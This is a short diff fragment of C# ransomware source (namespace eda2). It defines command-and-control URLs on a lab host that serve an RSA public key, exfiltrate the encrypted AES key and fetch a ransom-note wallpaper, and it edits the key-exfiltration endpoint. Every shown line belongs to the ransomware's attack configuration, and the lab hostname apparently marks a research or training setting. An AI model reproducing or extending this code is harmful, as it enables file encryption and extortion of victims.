@@ -32,7 +32,7 @@ namespace eda2
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
         string generatorUrl = "http://c2.lab.local/panel/publickey"; // serves RSA public key
-        string keySaveUrl = "http://c2.lab.local/panel/savekey.php";    // exfils the encrypted AES key
+        string keySaveUrl = "http://c2.lab.local/panel/savekey";    // exfils the encrypted AES key
         string backgroundImageUrl = "http://c2.lab.local/panel/ransomnote"; //desktop background ransomnote
 
 
